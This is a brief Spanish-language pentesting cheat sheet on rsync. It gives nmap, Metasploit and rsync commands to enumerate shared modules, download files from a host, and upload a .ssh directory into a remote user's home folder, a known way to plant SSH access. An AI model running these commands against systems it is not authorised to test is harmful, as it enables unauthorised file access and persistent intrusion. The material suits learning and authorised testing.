# RSycn

{% hint style="info" %}
**Rsync** es una herramienta de software para la sincronización de archivos y directorios entre dos ubicaciones en un sistema de archivos, utilizada comúnmente en sistemas Unix y Linux.
{% endhint %}

## Enumeración de carpetas compartidas

### Nmap

```bash
nmap -sV --script "rsync-list-modules" -p 873 192.168.1.1
```

### Metasploit

```bash
use auxiliary/scanner/rsync/modules_list
```

### RSync

#### Sin credenciales

```bash
rsync -av --list-only rsync://192.168.1.1:873
```

#### Con credenciales

```bash
rsync -av --list-only rsync://username@192.168.1.1
```

## Descargar archivos del host a la maquina anfitrión

```bash
rsync -av rsync://username@192.168.1.1:8730/shared_name ./ubicacion/local
```

## Subir archivos a la maquina host

```bash
rsync -av home_user/.ssh/ rsync://username@192.168.1.1/home_user/.ssh
```
